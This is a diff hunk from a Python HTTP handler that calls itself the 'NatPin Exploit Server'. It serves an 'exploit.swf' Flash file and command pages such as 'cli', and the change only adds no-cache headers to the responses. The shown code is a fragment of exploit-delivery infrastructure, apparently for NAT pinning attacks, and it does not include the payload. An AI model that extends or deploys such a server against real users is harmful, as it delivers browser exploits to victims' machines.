@@ -163,14 +163,14 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				agent = self.get_header(data,"USER-AGENT",":")
 				self.server.log("---" + agent,4)
 				if page =="exploit.swf":
-					respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+					respheader="""HTTP/1.1 200 OK\r\nContent-Type: application/x-shockwave-flash; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nCache-Control: no-cache\r\nContent-Length: $len$\r\n\r\n"""
 				else:
-					respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+					respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nCache-Control: no-cache\r\nContent-Length: $len$\r\n\r\n"""
 				f = open("exploit/"+page,"r")
 				body = f.read()
 				f.close()		
 			elif page in arrCommands:
-				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nContent-Length: $len$\r\n\r\n"""
+				respheader="""HTTP/1.1 200 OK\r\nContent-Type: text;html; charset=UTF-8\r\nServer: NatPin Exploit Server\r\nCache-Control: no-cache\r\nContent-Length: $len$\r\n\r\n"""
 				body=""
 				if page=="cli":
 					if len(_page.split("?"))!=2:
